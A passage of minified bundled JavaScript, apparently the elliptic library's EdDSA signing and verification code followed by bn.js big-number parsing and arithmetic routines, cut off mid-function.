        return this.eddsa.encodeInt(this.S())
    }),
    w.prototype.toBytes = function() {
        return this.Rencoded().concat(this.Sencoded())
    }
    ,
    w.prototype.toHex = function() {
        return M.encode(this.toBytes(), "hex").toUpperCase()
    }
    ,
    signature = w,
    signature
}
var eddsa, hasRequiredEddsa;
function requireEddsa() {
    if (hasRequiredEddsa)
        return eddsa;
    hasRequiredEddsa = 1;
    var _ = requireHash()
      , M = requireCurves()
      , j = requireUtils$5()
      , O = j.assert
      , x = j.parseBytes
      , w = requireKey()
      , b = requireSignature();
    function X(Y) {
        if (O(Y === "ed25519", "only tested with ed25519 so far"),
        !(this instanceof X))
            return new X(Y);
        Y = M[Y].curve,
        this.curve = Y,
        this.g = Y.g,
        this.g.precompute(Y.n.bitLength() + 1),
        this.pointClass = Y.point().constructor,
        this.encodingLength = Math.ceil(Y.n.bitLength() / 8),
        this.hash = _.sha512
    }
    return eddsa = X,
    X.prototype.sign = function(F, V) {
        F = x(F);
        var K = this.keyFromSecret(V)
          , Q = this.hashInt(K.messagePrefix(), F)
          , ee = this.g.mul(Q)
          , ae = this.encodePoint(ee)
          , ne = this.hashInt(ae, K.pubBytes(), F).mul(K.priv())
          , oe = Q.add(ne).umod(this.curve.n);
        return this.makeSignature({
            R: ee,
            S: oe,
            Rencoded: ae
        })
    }
    ,
    X.prototype.verify = function(F, V, K) {
        if (F = x(F),
        V = this.makeSignature(V),
        V.S().gte(V.eddsa.curve.n) || V.S().isNeg())
            return !1;
        var Q = this.keyFromPublic(K)
          , ee = this.hashInt(V.Rencoded(), Q.pubBytes(), F)
          , ae = this.g.mul(V.S())
          , ne = V.R().add(Q.pub().mul(ee));
        return ne.eq(ae)
    }
    ,
    X.prototype.hashInt = function() {
        for (var F = this.hash(), V = 0; V < arguments.length; V++)
            F.update(arguments[V]);
        return j.intFromLE(F.digest()).umod(this.curve.n)
    }
    ,
    X.prototype.keyFromPublic = function(F) {
        return w.fromPublic(this, F)
    }
    ,
    X.prototype.keyFromSecret = function(F) {
        return w.fromSecret(this, F)
    }
    ,
    X.prototype.makeSignature = function(F) {
        return F instanceof b ? F : new b(this,F)
    }
    ,
    X.prototype.encodePoint = function(F) {
        var V = F.getY().toArray("le", this.encodingLength);
        return V[this.encodingLength - 1] |= F.getX().isOdd() ? 128 : 0,
        V
    }
    ,
    X.prototype.decodePoint = function(F) {
        F = j.parseBytes(F);
        var V = F.length - 1
          , K = F.slice(0, V).concat(F[V] & -129)
          , Q = (F[V] & 128) !== 0
          , ee = j.intFromLE(K);
        return this.curve.pointFromY(ee, Q)
    }
    ,
    X.prototype.encodeInt = function(F) {
        return F.toArray("le", this.encodingLength)
    }
    ,
    X.prototype.decodeInt = function(F) {
        return j.intFromLE(F)
    }
    ,
    X.prototype.isPoint = function(F) {
        return F instanceof this.pointClass
    }
    ,
    eddsa
}
var hasRequiredElliptic;
function requireElliptic() {
    return hasRequiredElliptic || (hasRequiredElliptic = 1,
    function(_) {
        var M = _;
        M.version = require$$0$3.version,
        M.utils = requireUtils$5(),
        M.rand = requireBrorand(),
        M.curve = requireCurve(),
        M.curves = requireCurves(),
        M.ec = requireEc(),
        M.eddsa = requireEddsa()
    }(elliptic)),
    elliptic
}
var asn1$1 = {}, asn1 = {}, bn$5 = {
    exports: {}
}, bn$4 = bn$5.exports, hasRequiredBn$2;
function requireBn$2() {
    return hasRequiredBn$2 || (hasRequiredBn$2 = 1,
    function(_) {
        (function(M, j) {
            function O(ce, q) {
                if (!ce)
                    throw new Error(q || "Assertion failed")
            }
            function x(ce, q) {
                ce.super_ = q;
                var L = function() {};
                L.prototype = q.prototype,
                ce.prototype = new L,
                ce.prototype.constructor = ce
            }
            function w(ce, q, L) {
                if (w.isBN(ce))
                    return ce;
                this.negative = 0,
                this.words = null,
                this.length = 0,
                this.red = null,
                ce !== null && ((q === "le" || q === "be") && (L = q,
                q = 10),
                this._init(ce || 0, q || 10, L || "be"))
            }
            typeof M == "object" ? M.exports = w : j.BN = w,
            w.BN = w,
            w.wordSize = 26;
            var b;
            try {
                typeof window < "u" && typeof window.Buffer < "u" ? b = window.Buffer : b = requireDist$4().Buffer
            } catch {}
            w.isBN = function(q) {
                return q instanceof w ? !0 : q !== null && typeof q == "object" && q.constructor.wordSize === w.wordSize && Array.isArray(q.words)
            }
            ,
            w.max = function(q, L) {
                return q.cmp(L) > 0 ? q : L
            }
            ,
            w.min = function(q, L) {
                return q.cmp(L) < 0 ? q : L
            }
            ,
            w.prototype._init = function(q, L, U) {
                if (typeof q == "number")
                    return this._initNumber(q, L, U);
                if (typeof q == "object")
                    return this._initArray(q, L, U);
                L === "hex" && (L = 16),
                O(L === (L | 0) && L >= 2 && L <= 36),
                q = q.toString().replace(/\s+/g, "");
                var Z = 0;
                q[0] === "-" && (Z++,
                this.negative = 1),
                Z < q.length && (L === 16 ? this._parseHex(q, Z, U) : (this._parseBase(q, L, Z),
                U === "le" && this._initArray(this.toArray(), L, U)))
            }
            ,
            w.prototype._initNumber = function(q, L, U) {
                q < 0 && (this.negative = 1,
                q = -q),
                q < 67108864 ? (this.words = [q & 67108863],
                this.length = 1) : q < 4503599627370496 ? (this.words = [q & 67108863, q / 67108864 & 67108863],
                this.length = 2) : (O(q < 9007199254740992),
                this.words = [q & 67108863, q / 67108864 & 67108863, 1],
                this.length = 3),
                U === "le" && this._initArray(this.toArray(), L, U)
            }
            ,
            w.prototype._initArray = function(q, L, U) {
                if (O(typeof q.length == "number"),
                q.length <= 0)
                    return this.words = [0],
                    this.length = 1,
                    this;
                this.length = Math.ceil(q.length / 3),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te, se, de = 0;
                if (U === "be")
                    for (Z = q.length - 1,
                    te = 0; Z >= 0; Z -= 3)
                        se = q[Z] | q[Z - 1] << 8 | q[Z - 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                else if (U === "le")
                    for (Z = 0,
                    te = 0; Z < q.length; Z += 3)
                        se = q[Z] | q[Z + 1] << 8 | q[Z + 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                return this.strip()
            }
            ;
            function X(ce, q) {
                var L = ce.charCodeAt(q);
                return L >= 65 && L <= 70 ? L - 55 : L >= 97 && L <= 102 ? L - 87 : L - 48 & 15
            }
            function Y(ce, q, L) {
                var U = X(ce, L);
                return L - 1 >= q && (U |= X(ce, L - 1) << 4),
                U
            }
            w.prototype._parseHex = function(q, L, U) {
                this.length = Math.ceil((q.length - L) / 6),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te = 0, se = 0, de;
                if (U === "be")
                    for (Z = q.length - 1; Z >= L; Z -= 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8;
                else {
                    var re = q.length - L;
                    for (Z = re % 2 === 0 ? L + 1 : L; Z < q.length; Z += 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8
                }
                this.strip()
            }
            ;
            function F(ce, q, L, U) {
                for (var Z = 0, te = Math.min(ce.length, L), se = q; se < te; se++) {
                    var de = ce.charCodeAt(se) - 48;
                    Z *= U,
                    de >= 49 ? Z += de - 49 + 10 : de >= 17 ? Z += de - 17 + 10 : Z += de
                }
                return Z
            }
            w.prototype._parseBase = function(q, L, U) {
                this.words = [0],
                this.length = 1;
                for (var Z = 0, te = 1; te <= 67108863; te *= L)
                    Z++;
                Z--,
                te = te / L | 0;
                for (var se = q.length - U, de = se % Z, re = Math.min(se, se - de) + U, $ = 0, ie = U; ie < re; ie += Z)
                    $ = F(q, ie, ie + Z, L),
                    this.imuln(te),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($);
                if (de !== 0) {
                    var ve = 1;
                    for ($ = F(q, ie, q.length, L),
                    ie = 0; ie < de; ie++)
                        ve *= L;
                    this.imuln(ve),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($)
                }
                this.strip()
            }
            ,
            w.prototype.copy = function(q) {
                q.words = new Array(this.length);
                for (var L = 0; L < this.length; L++)
                    q.words[L] = this.words[L];
                q.length = this.length,
                q.negative = this.negative,
                q.red = this.red
            }
            ,
            w.prototype.clone = function() {
                var q = new w(null);
                return this.copy(q),
                q
            }
            ,
            w.prototype._expand = function(q) {
                for (; this.length < q; )
                    this.words[this.length++] = 0;
                return this
            }
            ,
            w.prototype.strip = function() {
                for (; this.length > 1 && this.words[this.length - 1] === 0; )
                    this.length--;
                return this._normSign()
            }
            ,
            w.prototype._normSign = function() {
                return this.length === 1 && this.words[0] === 0 && (this.negative = 0),
                this
            }
            ,
            w.prototype.inspect = function() {
                return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">"
            }
            ;
            var V = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"]
              , K = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5]
              , Q = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
            w.prototype.toString = function(q, L) {
                q = q || 10,
                L = L | 0 || 1;
                var U;
                if (q === 16 || q === "hex") {
                    U = "";
                    for (var Z = 0, te = 0, se = 0; se < this.length; se++) {
                        var de = this.words[se]
                          , re = ((de << Z | te) & 16777215).toString(16);
                        te = de >>> 24 - Z & 16777215,
                        Z += 2,
                        Z >= 26 && (Z -= 26,
                        se--),
                        te !== 0 || se !== this.length - 1 ? U = V[6 - re.length] + re + U : U = re + U
                    }
                    for (te !== 0 && (U = te.toString(16) + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                if (q === (q | 0) && q >= 2 && q <= 36) {
                    var $ = K[q]
                      , ie = Q[q];
                    U = "";
                    var ve = this.clone();
                    for (ve.negative = 0; !ve.isZero(); ) {
                        var ge = ve.modn(ie).toString(q);
                        ve = ve.idivn(ie),
                        ve.isZero() ? U = ge + U : U = V[$ - ge.length] + ge + U
                    }
                    for (this.isZero() && (U = "0" + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                O(!1, "Base should be between 2 and 36")
            }
            ,
            w.prototype.toNumber = function() {
                var q = this.words[0];
                return this.length === 2 ? q += this.words[1] * 67108864 : this.length === 3 && this.words[2] === 1 ? q += 4503599627370496 + this.words[1] * 67108864 : this.length > 2 && O(!1, "Number can only safely store up to 53 bits"),
                this.negative !== 0 ? -q : q
            }
            ,
            w.prototype.toJSON = function() {
                return this.toString(16)
            }
            ,
            w.prototype.toBuffer = function(q, L) {
                return O(typeof b < "u"),
                this.toArrayLike(b, q, L)
            }
            ,
            w.prototype.toArray = function(q, L) {
                return this.toArrayLike(Array, q, L)
            }
            ,
            w.prototype.toArrayLike = function(q, L, U) {
                var Z = this.byteLength()
                  , te = U || Math.max(1, Z);
                O(Z <= te, "byte array longer than desired length"),
                O(te > 0, "Requested array length <= 0"),
                this.strip();
                var se = L === "le", de = new q(te), re, $, ie = this.clone();
                if (se) {
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[$] = re;
                    for (; $ < te; $++)
                        de[$] = 0
                } else {
                    for ($ = 0; $ < te - Z; $++)
                        de[$] = 0;
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[te - $ - 1] = re
                }
                return de
            }
            ,
            Math.clz32 ? w.prototype._countBits = function(q) {
                return 32 - Math.clz32(q)
            }
            : w.prototype._countBits = function(q) {
                var L = q
                  , U = 0;
                return L >= 4096 && (U += 13,
                L >>>= 13),
                L >= 64 && (U += 7,
                L >>>= 7),
                L >= 8 && (U += 4,
                L >>>= 4),
                L >= 2 && (U += 2,
                L >>>= 2),
                U + L
            }
            ,
            w.prototype._zeroBits = function(q) {
                if (q === 0)
                    return 26;
                var L = q
                  , U = 0;
                return (L & 8191) === 0 && (U += 13,
                L >>>= 13),
                (L & 127) === 0 && (U += 7,
                L >>>= 7),
                (L & 15) === 0 && (U += 4,
                L >>>= 4),
                (L & 3) === 0 && (U += 2,
                L >>>= 2),
                (L & 1) === 0 && U++,
                U
            }
            ,
            w.prototype.bitLength = function() {
                var q = this.words[this.length - 1]
                  , L = this._countBits(q);
                return (this.length - 1) * 26 + L
            }
            ;
            function ee(ce) {
                for (var q = new Array(ce.bitLength()), L = 0; L < q.length; L++) {
                    var U = L / 26 | 0
                      , Z = L % 26;
                    q[L] = (ce.words[U] & 1 << Z) >>> Z
                }
                return q
            }
            w.prototype.zeroBits = function() {
                if (this.isZero())
                    return 0;
                for (var q = 0, L = 0; L < this.length; L++) {
                    var U = this._zeroBits(this.words[L]);
                    if (q += U,
                    U !== 26)
                        break
                }
                return q
            }
            ,
            w.prototype.byteLength = function() {
                return Math.ceil(this.bitLength() / 8)
            }
            ,
            w.prototype.toTwos = function(q) {
                return this.negative !== 0 ? this.abs().inotn(q).iaddn(1) : this.clone()
            }
            ,
            w.prototype.fromTwos = function(q) {
                return this.testn(q - 1) ? this.notn(q).iaddn(1).ineg() : this.clone()
            }
            ,
            w.prototype.isNeg = function() {
                return this.negative !== 0
            }
            ,
            w.prototype.neg = function() {
                return this.clone().ineg()
            }
            ,
            w.prototype.ineg = function() {
                return this.isZero() || (this.negative ^= 1),
                this
            }
            ,
            w.prototype.iuor = function(q) {
                for (; this.length < q.length; )
                    this.words[this.length++] = 0;
                for (var L = 0; L < q.length; L++)
                    this.words[L] = this.words[L] | q.words[L];
                return this.strip()
            }
            ,
            w.prototype.ior = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuor(q)
            }
            ,
            w.prototype.or = function(q) {
                return this.length > q.length ? this.clone().ior(q) : q.clone().ior(this)
            }
            ,
            w.prototype.uor = function(q) {
                return this.length > q.length ? this.clone().iuor(q) : q.clone().iuor(this)
            }
            ,
            w.prototype.iuand = function(q) {
                var L;
                this.length > q.length ? L = q : L = this;
                for (var U = 0; U < L.length; U++)
                    this.words[U] = this.words[U] & q.words[U];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.iand = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuand(q)
            }
            ,
            w.prototype.and = function(q) {
                return this.length > q.length ? this.clone().iand(q) : q.clone().iand(this)
            }
            ,
            w.prototype.uand = function(q) {
                return this.length > q.length ? this.clone().iuand(q) : q.clone().iuand(this)
            }
            ,
            w.prototype.iuxor = function(q) {
                var L, U;
                this.length > q.length ? (L = this,
                U = q) : (L = q,
                U = this);
                for (var Z = 0; Z < U.length; Z++)
                    this.words[Z] = L.words[Z] ^ U.words[Z];
                if (this !== L)
                    for (; Z < L.length; Z++)
                        this.words[Z] = L.words[Z];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.ixor = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuxor(q)
            }
            ,
            w.prototype.xor = function(q) {
                return this.length > q.length ? this.clone().ixor(q) : q.clone().ixor(this)
            }
            ,
            w.prototype.uxor = function(q) {
                return this.length > q.length ? this.clone().iuxor(q) : q.clone().iuxor(this)
            }
            ,
            w.prototype.inotn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = Math.ceil(q / 26) | 0
                  , U = q % 26;
                this._expand(L),
                U > 0 && L--;
                for (var Z = 0; Z < L; Z++)
                    this.words[Z] = ~this.words[Z] & 67108863;
                return U > 0 && (this.words[Z] = ~this.words[Z] & 67108863 >> 26 - U),
                this.strip()
            }
            ,
            w.prototype.notn = function(q) {
                return this.clone().inotn(q)
            }
            ,
            w.prototype.setn = function(q, L) {
                O(typeof q == "number" && q >= 0);
                var U = q / 26 | 0
                  , Z = q % 26;
                return this._expand(U + 1),
                L ? this.words[U] = this.words[U] | 1 << Z : this.words[U] = this.words[U] & ~(1 << Z),
                this.strip()
            }
            ,
            w.prototype.iadd = function(q) {
                var L;
                if (this.negative !== 0 && q.negative === 0)
                    return this.negative = 0,
                    L = this.isub(q),
                    this.negative ^= 1,
                    this._normSign();
                if (this.negative === 0 && q.negative !== 0)
                    return q.negative = 0,
                    L = this.isub(q),
                    q.negative = 1,
                    L._normSign();
                var U, Z;
                this.length > q.length ? (U = this,
                Z = q) : (U = q,
                Z = this);
                for (var te = 0, se = 0; se < Z.length; se++)
                    L = (U.words[se] | 0) + (Z.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                for (; te !== 0 && se < U.length; se++)
                    L = (U.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                if (this.length = U.length,
                te !== 0)
                    this.words[this.length] = te,
                    this.length++;
                else if (U !== this)
                    for (; se < U.length; se++)
                        this.words[se] = U.words[se];
                return this
            }
            ,
            w.prototype.add = function(q) {
                var L;
                return q.negative !== 0 && this.negative === 0 ? (q.negative = 0,
                L = this.sub(q),
                q.negative ^= 1,
                L) : q.negative === 0 && this.negative !== 0 ? (this.negative = 0,
                L = q.sub(this),
                this.negative = 1,
                L) : this.length > q.length ? this.clone().iadd(q) : q.clone().iadd(this)
            }
            ,
            w.prototype.isub = function(q) {
                if (q.negative !== 0) {
                    q.negative = 0;
                    var L = this.iadd(q);
                    return q.negative = 1,
                    L._normSign()
                } else if (this.negative !== 0)
                    return this.negative = 0,
                    this.iadd(q),
                    this.negative = 1,
                    this._normSign();
                var U = this.cmp(q);
                if (U === 0)
                    return this.negative = 0,
                    this.length = 1,
                    this.words[0] = 0,
                    this;
                var Z, te;
                U > 0 ? (Z = this,
                te = q) : (Z = q,
                te = this);
                for (var se = 0, de = 0; de < te.length; de++)
                    L = (Z.words[de] | 0) - (te.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                for (; se !== 0 && de < Z.length; de++)
                    L = (Z.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                if (se === 0 && de < Z.length && Z !== this)
                    for (; de < Z.length; de++)
                        this.words[de] = Z.words[de];
                return this.length = Math.max(this.length, de),
                Z !== this && (this.negative = 1),
                this.strip()
            }
            ,
            w.prototype.sub = function(q) {
                return this.clone().isub(q)
            }
            ;
            function ae(ce, q, L) {
                L.negative = q.negative ^ ce.negative;
                var U = ce.length + q.length | 0;
                L.length = U,
                U = U - 1 | 0;
                var Z = ce.words[0] | 0
                  , te = q.words[0] | 0
                  , se = Z * te
                  , de = se & 67108863
                  , re = se / 67108864 | 0;
                L.words[0] = de;
                for (var $ = 1; $ < U; $++) {
                    for (var ie = re >>> 26, ve = re & 67108863, ge = Math.min($, q.length - 1), Re = Math.max(0, $ - ce.length + 1); Re <= ge; Re++) {
                        var Pe = $ - Re | 0;
                        Z = ce.words[Pe] | 0,
                        te = q.words[Re] | 0,
                        se = Z * te + ve,
                        ie += se / 67108864 | 0,
                        ve = se & 67108863
                    }
                    L.words[$] = ve | 0,
                    re = ie | 0
                }
                return re !== 0 ? L.words[$] = re | 0 : L.length--,
                L.strip()
            }
            var ne = function(q, L, U) {
                var Z = q.words, te = L.words, se = U.words, de = 0, re, $, ie, ve = Z[0] | 0, ge = ve & 8191, Re = ve >>> 13, Pe = Z[1] | 0, Ie = Pe & 8191, Te = Pe >>> 13, Le = Z[2] | 0, Ze = Le & 8191, $e = Le >>> 13, Ne = Z[3] | 0, qe = Ne & 8191, Ve = Ne >>> 13, lt = Z[4] | 0, nt = lt & 8191, je = lt >>> 13, Ke = Z[5] | 0, Qe = Ke & 8191, We = Ke >>> 13, mt = Z[6] | 0, ct = mt & 8191, vt = mt >>> 13, we = Z[7] | 0, _e = we & 8191, Ce = we >>> 13, st = Z[8] | 0, et = st & 8191, tt = st >>> 13, He = Z[9] | 0, ke = He & 8191, Me = He >>> 13, Ue = te[0] | 0, rt = Ue & 8191, dt = Ue >>> 13, Et = te[1] | 0, ft = Et & 8191, gt = Et >>> 13, Yt = te[2] | 0, Ct = Yt & 8191, Ot = Yt >>> 13, Vt = te[3] | 0, Pt = Vt & 8191, Bt = Vt >>> 13, xr = te[4] | 0, Dt = xr & 8191, Ft = xr >>> 13, Mr = te[5] | 0, at = Mr & 8191, ze = Mr >>> 13, Je = te[6] | 0, ht = Je & 8191, _t = Je >>> 13, Ge = te[7] | 0, Ye = Ge & 8191, it = Ge >>> 13, Fe = te[8] | 0, ut = Fe & 8191, wt = Fe >>> 13, At = te[9] | 0, St = At & 8191, Tt = At >>> 13;
                U.negative = q.negative ^ L.negative,
                U.length = 19,
                re = Math.imul(ge, rt),
                $ = Math.imul(ge, dt),
                $ = $ + Math.imul(Re, rt) | 0,
                ie = Math.imul(Re, dt);
                var er = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (er >>> 26) | 0,
                er &= 67108863,
                re = Math.imul(Ie, rt),
                $ = Math.imul(Ie, dt),
                $ = $ + Math.imul(Te, rt) | 0,
                ie = Math.imul(Te, dt),
                re = re + Math.imul(ge, ft) | 0,
                $ = $ + Math.imul(ge, gt) | 0,
                $ = $ + Math.imul(Re, ft) | 0,
                ie = ie + Math.imul(Re, gt) | 0;
                var Xt = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Xt >>> 26) | 0,
                Xt &= 67108863,
                re = Math.imul(Ze, rt),
                $ = Math.imul(Ze, dt),
                $ = $ + Math.imul($e, rt) | 0,
                ie = Math.imul($e, dt),
                re = re + Math.imul(Ie, ft) | 0,
                $ = $ + Math.imul(Ie, gt) | 0,
                $ = $ + Math.imul(Te, ft) | 0,
                ie = ie + Math.imul(Te, gt) | 0,
                re = re + Math.imul(ge, Ct) | 0,
                $ = $ + Math.imul(ge, Ot) | 0,
                $ = $ + Math.imul(Re, Ct) | 0,
                ie = ie + Math.imul(Re, Ot) | 0;
                var pr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (pr >>> 26) | 0,
                pr &= 67108863,
                re = Math.imul(qe, rt),
                $ = Math.imul(qe, dt),
                $ = $ + Math.imul(Ve, rt) | 0,
                ie = Math.imul(Ve, dt),
                re = re + Math.imul(Ze, ft) | 0,
                $ = $ + Math.imul(Ze, gt) | 0,
                $ = $ + Math.imul($e, ft) | 0,
                ie = ie + Math.imul($e, gt) | 0,
                re = re + Math.imul(Ie, Ct) | 0,
                $ = $ + Math.imul(Ie, Ot) | 0,
                $ = $ + Math.imul(Te, Ct) | 0,
                ie = ie + Math.imul(Te, Ot) | 0,
                re = re + Math.imul(ge, Pt) | 0,
                $ = $ + Math.imul(ge, Bt) | 0,
                $ = $ + Math.imul(Re, Pt) | 0,
                ie = ie + Math.imul(Re, Bt) | 0;
                var or = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (or >>> 26) | 0,
                or &= 67108863,
                re = Math.imul(nt, rt),
                $ = Math.imul(nt, dt),
                $ = $ + Math.imul(je, rt) | 0,
                ie = Math.imul(je, dt),
                re = re + Math.imul(qe, ft) | 0,
                $ = $ + Math.imul(qe, gt) | 0,
                $ = $ + Math.imul(Ve, ft) | 0,
                ie = ie + Math.imul(Ve, gt) | 0,
                re = re + Math.imul(Ze, Ct) | 0,
                $ = $ + Math.imul(Ze, Ot) | 0,
                $ = $ + Math.imul($e, Ct) | 0,
                ie = ie + Math.imul($e, Ot) | 0,
                re = re + Math.imul(Ie, Pt) | 0,
                $ = $ + Math.imul(Ie, Bt) | 0,
                $ = $ + Math.imul(Te, Pt) | 0,
                ie = ie + Math.imul(Te, Bt) | 0,
                re = re + Math.imul(ge, Dt) | 0,
                $ = $ + Math.imul(ge, Ft) | 0,
                $ = $ + Math.imul(Re, Dt) | 0,
                ie = ie + Math.imul(Re, Ft) | 0;
                var yr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (yr >>> 26) | 0,
                yr &= 67108863,
                re = Math.imul(Qe, rt),
                $ = Math.imul(Qe, dt),
                $ = $ + Math.imul(We, rt) | 0,
                ie = Math.imul(We, dt),
                re = re + Math.imul(nt, ft) | 0,
                $ = $ + Math.imul(nt, gt) | 0,
                $ = $ + Math.imul(je, ft) | 0,
                ie = ie + Math.imul(je, gt) | 0,
                re = re + Math.imul(qe, Ct) | 0,
                $ = $ + Math.imul(qe, Ot) | 0,
                $ = $ + Math.imul(Ve, Ct) | 0,
                ie = ie + Math.imul(Ve, Ot) | 0,
                re = re + Math.imul(Ze, Pt) | 0,
                $ = $ + Math.imul(Ze, Bt) | 0,
                $ = $ + Math.imul($e, Pt) | 0,
                ie = ie + Math.imul($e, Bt) | 0,
                re = re + Math.imul(Ie, Dt) | 0,
                $ = $ + Math.imul(Ie, Ft) | 0,
                $ = $ + Math.imul(Te, Dt) | 0,
                ie = ie + Math.imul(Te, Ft) | 0,
                re = re + Math.imul(ge, at) | 0,
                $ = $ + Math.imul(ge, ze) | 0,
                $ = $ + Math.imul(Re, at) | 0,
                ie = ie + Math.imul(Re, ze) | 0;
                var vr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (vr >>> 26) | 0,
                vr &= 67108863,
                re = Math.imul(ct, rt),
                $ = Math.imul(ct, dt),
                $ = $ + Math.imul(vt, rt) | 0,
                ie = Math.imul(vt, dt),
                re = re + Math.imul(Qe, ft) | 0,
                $ = $ + Math.imul(Qe, gt) | 0,
                $ = $ + Math.imul(We, ft) | 0,
                ie = ie + Math.imul(We, gt) | 0,
                re = re + Math.imul(nt, Ct) | 0,
                $ = $ + Math.imul(nt, Ot) | 0,
                $ = $ + Math.imul(je, Ct) | 0,
                ie = ie + Math.imul(je, Ot) | 0,
                re = re + Math.imul(qe, Pt) | 0,
                $ = $ + Math.imul(qe, Bt) | 0,
                $ = $ + Math.imul(Ve, Pt) | 0,
                ie = ie + Math.imul(Ve, Bt) | 0,
                re = re + Math.imul(Ze, Dt) | 0,
                $ = $ + Math.imul(Ze, Ft) | 0,
                $ = $ + Math.imul($e, Dt) | 0,
                ie = ie + Math.imul($e, Ft) | 0,
                re = re + Math.imul(Ie, at) | 0,
                $ = $ + Math.imul(Ie, ze) | 0,
                $ = $ + Math.imul(Te, at) | 0,
                ie = ie + Math.imul(Te, ze) | 0,
                re = re + Math.imul(ge, ht) | 0,
                $ = $ + Math.imul(ge, _t) | 0,
                $ = $ + Math.imul(Re, ht) | 0,
                ie = ie + Math.imul(Re, _t) | 0;
                var gr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (gr >>> 26) | 0,
                gr &= 67108863,
                re = Math.imul(_e, rt),
                $ = Math.imul(_e, dt),
                $ = $ + Math.imul(Ce, rt) | 0,
                ie = Math.imul(Ce, dt),
                re = re + Math.imul(ct, ft) | 0,
                $ = $ + Math.imul(ct, gt) | 0,
                $ = $ + Math.imul(vt, ft) | 0,
                ie = ie + Math.imul(vt, gt) | 0,
                re = re + Math.imul(Qe, Ct) | 0,
                $ = $ + Math.imul(Qe, Ot) | 0,
                $ = $ + Math.imul(We, Ct) | 0,
                ie = ie + Math.imul(We, Ot) | 0,
                re = re + Math.imul(nt, Pt) | 0,
                $ = $ + Math.imul(nt, Bt) | 0,
                $ = $ + Math.imul(je, Pt) | 0,
                ie = ie + Math.imul(je, Bt) | 0,
                re = re + Math.imul(qe, Dt) | 0,
                $ = $ + Math.imul(qe, Ft) | 0,
                $ = $ + Math.imul(Ve, Dt) | 0,
                ie = ie + Math.imul(Ve, Ft) | 0,
                re = re + Math.imul(Ze, at) | 0,
                $ = $ + Math.imul(Ze, ze) | 0,
                $ = $ + Math.imul($e, at) | 0,
                ie = ie + Math.imul($e, ze) | 0,
                re = re + Math.imul(Ie, ht) | 0,
                $ = $ + Math.imul(Ie, _t) | 0,
                $ = $ + Math.imul(Te, ht) | 0,
                ie = ie + Math.imul(Te, _t) | 0,
                re = re + Math.imul(ge, Ye) | 0,
                $ = $ + Math.imul(ge, it) | 0,
                $ = $ + Math.imul(Re, Ye) | 0,
                ie = ie + Math.imul(Re, it) | 0;
                var Sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Sr >>> 26) | 0,
                Sr &= 67108863,
                re = Math.imul(et, rt),
                $ = Math.imul(et, dt),
                $ = $ + Math.imul(tt, rt) | 0,
                ie = Math.imul(tt, dt),
                re = re + Math.imul(_e, ft) | 0,
                $ = $ + Math.imul(_e, gt) | 0,
                $ = $ + Math.imul(Ce, ft) | 0,
                ie = ie + Math.imul(Ce, gt) | 0,
                re = re + Math.imul(ct, Ct) | 0,
